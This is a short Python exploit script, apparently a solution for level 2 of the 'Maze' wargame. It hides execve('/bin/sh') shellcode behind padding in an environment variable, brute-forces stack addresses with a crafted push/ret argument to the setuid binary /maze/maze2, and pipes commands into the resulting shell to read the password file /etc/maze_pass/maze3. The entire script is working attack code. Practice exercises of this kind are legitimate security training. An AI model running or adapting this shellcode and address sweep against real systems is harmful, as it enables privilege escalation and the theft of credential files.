#!/usr/bin/env python3
# sweep3 - the Maze L2 target sweep, entirely in python (no shell
# mangling of the binary env bytes).
import os, struct, subprocess
SC = bytes.fromhex('31c050682f2f7368682f62696e89e3505389e1b00bcd80')
# bytes env: avoid the utf-8 mangling of the binary P value
base_env = {k.encode(): v.encode() for k, v in os.environ.items()}
t = 0xffffc000
n = 0
hit = False
while t <= 0xfffff000:
    ib = struct.pack('<I', t)
    t += 0x8
    if 0 in ib:
        continue
    env = dict(base_env)
    env[b'P'] = b'A' * 2000 + SC
    arg = b'\x68' + ib + b'\xc3' + b'AA'
    n += 1
    try:
        p = subprocess.run(['/maze/maze2', arg], input=b'id\ncat /etc/maze_pass/maze3\nexit\n',
                           env=env, capture_output=True, timeout=5)
        if b'uid=15003' in p.stdout + p.stderr:
            print('HIT at 0x%08x' % t)
            print((p.stdout + p.stderr).decode('latin-1', 'replace')[:300])
            hit = True
            break
    except Exception:
        pass
if not hit:
    print("no hit in", n, "targets")
